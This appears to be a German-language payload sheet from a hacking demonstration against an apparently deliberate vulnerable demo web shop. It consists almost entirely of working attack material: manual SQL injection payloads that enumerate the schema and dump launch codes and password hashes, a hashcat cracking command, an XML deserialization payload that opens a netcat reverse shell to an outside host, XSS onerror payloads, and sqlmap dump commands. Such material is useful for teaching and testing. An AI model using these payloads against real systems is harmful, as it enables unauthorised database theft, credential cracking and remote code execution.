Im Folgenden findet ihr die verwendeten Payloads der Hacking-Demonstration.

# Manual SQLi

## Enumerate number of columns:

```JSON
{"email":"asdf@asldf.adgh","name":"' ORDER BY 6;--","source":"Friend"}
```

Notiz: Spielen mit der Anzahl der Spalten, bei 7 ändert sich die Fehlermeldung

## Enumerate strings:

```JSON
{"email":"asdf@asldf.adgh","name":"' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--","source":"Friend"}
```

Strings sind die Positionen: 3,4,5,6

## Enumerate Tables:

```JSON
{"email":"asdf@asldf.adgh","name":"' UNION SELECT NULL,NULL,NULL,NULL,GROUP_CONCAT(TABLE_NAME SEPARATOR ', '),NULL FROM information_schema.tables --","source":"Friend"}`
```

Notiz: Letze Zeile wird ausgegeben und enthält in der entsprechenden Variable alle gewünschten Tabellennamen (ink. Systemtabellen)

## Enumerate Columns:

```JSON
{"email":"asdf@asldf.adgh","name":"' UNION SELECT NULL,NULL,NULL,NULL,GROUP_CONCAT(COLUMN_NAME SEPARATOR ', '),NULL FROM information_schema.columns --","source":"Friend"}`
```

Notiz: Letze Zeile wird ausgegeben und enthält in der entsprechenden Variable alle gewünschten Spaltennamen - Mapping mit XMV


## Get Launchcodes:

```JSON
{"email":"asdf@asldf.adgh","name":"' UNION SELECT NULL,NULL,NULL,NULL,GROUP_CONCAT(CONCAT(DEVICE, ':', LAUNCH_CODE) SEPARATOR ', '),NULL FROM LAUNCH_CODE --","source":"Friend"}`
```

## Get Passwords:

```JSON
{"email":"asdf@asldf.adgh","name":"' UNION SELECT NULL,NULL,NULL,NULL,GROUP_CONCAT(CONCAT(USERNAME, ':', PASSWORD) SEPARATOR ', '),NULL FROM APP_USER --","source":"Friend"}`
```

## Crack Hash:

```bash
hashcat -m 3200 -a 0 hashes /usr/share/wordlists/seclists/Passwords/Common-Credentials/best1050.txt`
```

# RCE:

## Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<newsletter class="dynamic-proxy">
    <interface>com.andrena.newsshop.model.Newsletterable</interface>
    <handler class="java.beans.EventHandler">
        <target class="java.lang.ProcessBuilder">
            <command>
                <string>nc</string>
                <string>172.19.0.1</string>
                <string>1337</string>
                <string>-e</string>
                <string>/bin/sh</string>
            </command>
        </target>
        <action>start</action>
    </handler>
</newsletter>
```

## Shell Catcher

```bash
nc -lvnp 1337
```

## curl:
```bash
curl 'http://localhost:8089/api/newsletter/import' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'authorization: Basic YWRtaW46YWRtaW4=' \
  -H 'Content-Type: application/xml' \
  --data-binary '@payload.xml' \
  --request POST
```
  
# XSS / CSRF

```JSON
{"email":"<img src=\"a\" onerror=\"alert(0)\" />",
"name":"<img src=\"a\" onerror=\"alert(1)\" />","source":"<img src=\"a\" onerror=\"alert(2)\" />",
"mail_properties":"<img src=\"a\" onerror=\"alert(3)\" />"
}
```

# sqlmap

```bash
sqlmap -r req --flush
```

```bash
sqlmap -r req --dump --randomize=email --flush
```

```bash
sqlmap -r req --dump --randomize=email --ignore-code=409,500 --flush
```

```bash
sqlmap -r req -D PUBLIC -T APP_USER -C username,password --dump --randomize=email --ignore-code=409,500 --flush
```

```bash
sqlmap -r req --technique=BT --level 5 --risk 3 --dump --flush
```